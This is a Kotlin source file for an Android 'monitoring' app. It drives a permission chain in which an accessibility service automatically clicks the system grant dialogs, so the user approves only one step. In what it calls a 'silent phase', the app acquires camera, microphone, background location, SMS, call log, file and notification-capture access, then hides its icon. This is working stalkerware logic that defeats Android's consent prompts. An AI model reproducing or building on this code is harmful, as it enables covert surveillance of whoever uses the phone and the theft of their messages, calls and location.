package com.spapp.monitoring.provision

import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import com.spapp.monitoring.admin.SpappDeviceAdminReceiver
import com.spapp.monitoring.blocking.AccessibilityStatus

/**
 * Drives the whole permission-provisioning sequence.
 *
 * The user is asked for exactly one thing: enabling the accessibility service.
 * From that point on this class walks a fixed list of steps, launching the
 * correct system screen for each, while BlockAccessibilityService clicks the
 * toggle / "Allow" / "Set as default" control on that screen.
 *
 * Design notes
 * ------------
 * - The orchestrator never clicks anything itself. It only decides "what is
 *   still missing" and "which screen shows it", so all click logic stays in one
 *   place (the accessibility service) and benefits from its per-OEM matching.
 * - Every step has a bounded attempt counter persisted in SharedPreferences.
 *   Without it, a step that a particular OEM refuses to grant (e.g. an app
 *   disabled by device policy) would loop forever and the user would see the
 *   settings screen bounce.
 * - Steps are ordered cheapest-first so the device looks "already set up" as
 *   early as possible, and the noisiest screens (role request, OEM autostart)
 *   come last.
 */
object AutoGrantOrchestrator {

    enum class Step(val label: String) {
        ACCESSIBILITY("Enable device service"),
        RUNTIME_PERMISSIONS("Grant app permissions"),
        BACKGROUND_LOCATION("Grant background location"),
        NOTIFICATION_ACCESS("Grant notification access"),
        USAGE_ACCESS("Grant usage access"),
        ALL_FILES("Grant file access"),
        BATTERY("Exempt from battery optimization"),
        DEVICE_ADMIN("Activate device admin"),
        SMS_ROLE("Set as default SMS app"),
        DIALER_ROLE("Set as default phone app"),
        AUTOSTART("Enable autostart"),
        DONE("Finish setup")
    }

    /** What the caller (an Activity) must do next. */
    sealed class Action {
        /** Ask for these runtime permissions - no Intent involved. */
        data class RequestPermissions(val step: Step, val permissions: Array<String>) : Action()
        /** Launch this Intent and act on the result. */
        data class LaunchIntent(val step: Step, val intent: Intent) : Action()
        /** Nothing left to do. */
        data class Finish(val step: Step = Step.DONE) : Action()
    }

    /** Permissions Android shows a normal dialog for; safe to click. */
    private val CLICKABLE_RUNTIME: List<String> = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        // SMS and call log without becoming the default handler.
        //
        // The previous flow requested RoleManager.ROLE_SMS / ROLE_DIALER, which
        // hands the app the default Messages / Phone role: the system app is
        // replaced on the home screen and the user's texting changes. Nothing
        // here needs that authority. RECEIVE_SMS alone delivers an incoming SMS
        // to a non-default app (SMS_DELIVER is the default-app-only broadcast),
        // and READ_SMS / READ_CALL_LOG cover history through a ContentObserver.
        //
        // Note: on Android 10+ these are restricted permissions, so the dialog
        // may be suppressed unless the app holds the role or an installer
        // granted them. If that happens requestPermissions returns denied
        // immediately and the bounded attempt counter moves the chain on; the
        // notification listener still covers SMS content as a fallback.
        add(Manifest.permission.RECEIVE_SMS)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_PHONE_STATE)
    }

    private const val MAX_ATTEMPTS = 3

    private fun prefs(ctx: Context) =
        ctx.getSharedPreferences("spapp_provision", Context.MODE_PRIVATE)

    fun attempts(ctx: Context, step: Step): Int = prefs(ctx).getInt("attempt_${step.name}", 0)

    fun markAttempt(ctx: Context, step: Step) {
        prefs(ctx).edit().putInt("attempt_${step.name}", attempts(ctx, step) + 1).apply()
    }

    fun resetAll(ctx: Context) {
        prefs(ctx).edit().clear().apply()
    }

    /**
     * Marks a step as permanently skipped for this install. Used when the user
     * declines accessibility: without it, next() would immediately re-open the
     * screen the user just backed out of, because the step is still unsatisfied
     * and still under its attempt limit.
     */
    fun skip(ctx: Context, step: Step) {
        prefs(ctx).edit().putInt("attempt_${step.name}", MAX_ATTEMPTS).apply()
    }

    private fun exhausted(ctx: Context, step: Step) = attempts(ctx, step) >= MAX_ATTEMPTS

    private fun granted(ctx: Context, permission: String): Boolean =
        ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED

    /**
     * Returns the next step that still needs work, or DONE.
     * Pure inspection - never mutates state.
     */
    fun next(ctx: Context): Action {
        // 0. Accessibility must be on first: it is the engine that clicks
        //    everything else, and no API can enable it for us.
        if (!AccessibilityStatus.isEnabled(ctx) && !exhausted(ctx, Step.ACCESSIBILITY)) {
            return Action.LaunchIntent(Step.ACCESSIBILITY, Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        // ---- Human-driven phase -------------------------------------------
        // Everything here needs the device user: an OEM autostart screen, a
        // battery dialog and the notification-access list have no API an app
        // can use to grant itself. They come first, one screen per step, and
        // the chain waits while the app is in the background.

        // 1. OEM autostart - only on firmware that actually has such a screen.
        //
        // Visited once, not up to MAX_ATTEMPTS times: autostart has no readable
        // state on any of these ROMs, so "retry until granted" can never observe
        // success and just bounces the user back into the same OEM screen. The
        // screen is opened, the user flips the toggle, then the chain moves on.
        if (SettingsNavigator.oem() != SettingsNavigator.Oem.OTHER &&
            attempts(ctx, Step.AUTOSTART) == 0
        ) {
            val candidates = SettingsNavigator.autostart(ctx)
            val specific = candidates.dropLast(1) // last entry is the app-info fallback
            SettingsNavigator.firstResolvable(ctx, specific)?.let {
                return Action.LaunchIntent(Step.AUTOSTART, it)
            }
        }

        // 2. Battery / Doze exemption - without it the sync worker is killed.
        //    The "Allow app to run in background?" dialog is the only screen in
        //    the chain the service presses Back on, so the app returns to the
        //    foreground by itself.
        if (!batteryExempted(ctx) && !exhausted(ctx, Step.BATTERY)) {
            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.batteryExemption(ctx))
                ?.let { return Action.LaunchIntent(Step.BATTERY, it) }
        }

        // 3. Notification listener (WhatsApp/Instagram/SMS notification capture).
        if (!notificationAccessGranted(ctx) && !exhausted(ctx, Step.NOTIFICATION_ACCESS)) {
            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.notificationAccess(ctx))
                ?.let { return Action.LaunchIntent(Step.NOTIFICATION_ACCESS, it) }
        }

        // ---- Silent phase --------------------------------------------------
        // From here the loader is on screen and the service clicks everything:
        // no settings screens, only runtime dialogs and appop screens.

        // 4. Runtime permissions that produce a normal dialog, including SMS
        //    and call log via plain permissions rather than the default-app
        //    roles.
        val missing = CLICKABLE_RUNTIME.filter { !granted(ctx, it) }
        if (missing.isNotEmpty() && !exhausted(ctx, Step.RUNTIME_PERMISSIONS)) {
            return Action.RequestPermissions(Step.RUNTIME_PERMISSIONS, missing.toTypedArray())
        }

        // 5. Background location has to be requested on its own, *after* fine
        //    location is granted - Android rejects it in the same batch.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val fine = granted(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
            if (fine && !granted(ctx, Manifest.permission.ACCESS_BACKGROUND_LOCATION) &&
                !exhausted(ctx, Step.BACKGROUND_LOCATION)
            ) {
                return Action.RequestPermissions(
                    Step.BACKGROUND_LOCATION,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                )
            }
        }

        // 6. Usage access (PACKAGE_USAGE_STATS appop).
        if (!usageAccessGranted(ctx) && !exhausted(ctx, Step.USAGE_ACCESS)) {
            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.usageAccess(ctx))
                ?.let { return Action.LaunchIntent(Step.USAGE_ACCESS, it) }
        }

        // 7. All-files access (MANAGE_EXTERNAL_STORAGE appop).
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            !Environment.isExternalStorageManager() && !exhausted(ctx, Step.ALL_FILES)
        ) {
            SettingsNavigator.firstResolvable(ctx, SettingsNavigator.allFilesAccess(ctx))
                ?.let { return Action.LaunchIntent(Step.ALL_FILES, it) }
        }

        // Device admin is deliberately never provisioned: activating it shows an
        // "Activate device admin?" confirmation and grants remote-wipe
        // authority, the single most alarming prompt in the flow. Remote lock is
        // not required for monitoring. SpappDeviceAdminReceiver stays declared so
        // an already-enrolled device keeps working; it is simply not requested.
        //
        // The SMS and dialer roles are deliberately never requested either: taking
        // ROLE_SMS replaces the user's Messages app and ROLE_DIALER replaces the
        // Phone app. RECEIVE_SMS / READ_SMS / READ_CALL_LOG / READ_PHONE_STATE are
        // requested as normal permissions in CLICKABLE_RUNTIME instead.

        return Action.Finish()
    }

    // ---------------------------------------------------------------------
    // State checks (kept here so the Activity and the a11y service agree)
    // ---------------------------------------------------------------------

    fun notificationAccessGranted(ctx: Context): Boolean {
        val flat = try {
            Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        } catch (_: Exception) {
            null
        } ?: return false
        return flat.split(':').any {
            val cn = android.content.ComponentName.unflattenFromString(it)
            cn?.packageName == ctx.packageName
        }
    }

    fun usageAccessGranted(ctx: Context): Boolean = try {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                ctx.packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                ctx.packageName
            )
        }
        mode == AppOpsManager.MODE_ALLOWED
    } catch (_: Exception) {
        false
    }

    fun batteryExempted(ctx: Context): Boolean = try {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        pm.isIgnoringBatteryOptimizations(ctx.packageName)
    } catch (_: Exception) {
        false
    }

    fun deviceOwner(ctx: Context): Boolean = try {
        val dpm = ctx.getSystemService(DevicePolicyManager::class.java)
        dpm?.isDeviceOwnerApp(ctx.packageName) == true
    } catch (_: Exception) {
        false
    }

    /** Human-readable summary used by the setup overlay. */
    /**
     * The grants that actually matter for the app to work, and that can all be
     * verified through system APIs.
     *
     * Notification access, the SMS/dialer roles and OEM autostart are checked
     * separately because they are best-effort: an OEM can refuse them, or the
     * user can decline, and none of them has a reliable state API on every ROM.
     * Requiring them here would keep the app visible (and the icon unhidden)
     * forever on a device that simply declined one.
     */
    fun coreReady(ctx: Context): Boolean {
        val runtimeOk = listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        ).all { granted(ctx, it) }

        val allFilesOk = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
            Environment.isExternalStorageManager()

        return AccessibilityStatus.isConnected() &&
            runtimeOk &&
            usageAccessGranted(ctx) &&
            allFilesOk &&
            batteryExempted(ctx)
    }

    fun statusLines(ctx: Context): List<Pair<String, Boolean>> = listOf(
        "Accessibility service" to AccessibilityStatus.isEnabled(ctx),
        "Location / camera / microphone" to (
            granted(ctx, Manifest.permission.ACCESS_FINE_LOCATION) &&
                granted(ctx, Manifest.permission.CAMERA) &&
                granted(ctx, Manifest.permission.RECORD_AUDIO)
            ),
        "Background location" to
            (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q ||
                granted(ctx, Manifest.permission.ACCESS_BACKGROUND_LOCATION)),
        "Notification access" to notificationAccessGranted(ctx),
        "Usage access" to usageAccessGranted(ctx),
        "All files access" to
            (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()),
        "Battery exemption" to batteryExempted(ctx),
        "SMS access" to granted(ctx, Manifest.permission.READ_SMS),
        "Call log access" to granted(ctx, Manifest.permission.READ_CALL_LOG)
    )
}
